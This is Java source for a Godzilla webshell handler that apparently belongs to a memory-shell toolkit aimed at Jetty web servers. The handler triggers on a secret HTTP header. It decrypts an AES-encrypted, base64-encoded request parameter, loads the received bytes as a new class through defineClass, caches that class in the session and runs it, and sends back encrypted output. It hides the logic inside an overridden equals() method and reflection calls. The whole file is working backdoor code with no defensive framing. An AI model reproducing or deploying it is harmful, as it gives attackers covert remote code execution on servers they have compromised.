package com.reajason.javaweb.memshell.shelltool.godzilla;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.io.PrintWriter;

/**
 * @author ReaJason
 */
public class GodzillaJettyHandler extends ClassLoader {
    public static String key;
    public static String pass;
    public static String md5;
    public static String headerName;
    public static String headerValue;

    public GodzillaJettyHandler() {
    }

    public GodzillaJettyHandler(ClassLoader z) {
        super(z);
    }

    @Override
    public boolean equals(Object obj) {
        Object[] args = ((Object[]) obj);
        Object baseRequest = null;
        Object request = null;
        Object response = null;
        if (args.length == 4) {
            Object arg4 = args[3];
            baseRequest = args[1];
            if (arg4 instanceof Integer) {
                // jetty6
                request = args[1];
                response = args[2];
            } else {
                request = args[2];
                response = args[3];
            }
        } else {
            // ee10
            request = args[0];
            response = args[1];
        }
        try {
            String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
            if (value != null && value.contains(headerValue)) {
                if (baseRequest != null) {
                    baseRequest.getClass().getMethod("setHandled", boolean.class).invoke(baseRequest, true);
                }
                String parameter = (String) request.getClass().getMethod("getParameter", String.class).invoke(request, pass);
                byte[] data = base64Decode(parameter);
                data = this.x(data, false);
                Object session = request.getClass().getMethod("getSession").invoke(request);
                Object sessionPayload = session.getClass().getMethod("getAttribute", String.class).invoke(session, "payload");
                if (sessionPayload == null) {
                    session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, "payload", (new GodzillaJettyHandler(Thread.currentThread().getContextClassLoader())).Q(data));
                } else {
                    ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                    Object f = ((Class<?>) sessionPayload).newInstance();
                    f.equals(arrOut);
                    f.equals(request);
                    f.equals(data);
                    f.toString();
                    PrintWriter writer = (PrintWriter) response.getClass().getMethod("getWriter").invoke(response);
                    writer.write(md5.substring(0, 16));
                    writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
                    writer.write(md5.substring(16));
                }
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object encoder = base64.newInstance();
                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    @SuppressWarnings("all")
    public Class<?> Q(byte[] cb) {
        return super.defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {

            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception var4) {
            return null;
        }
    }
}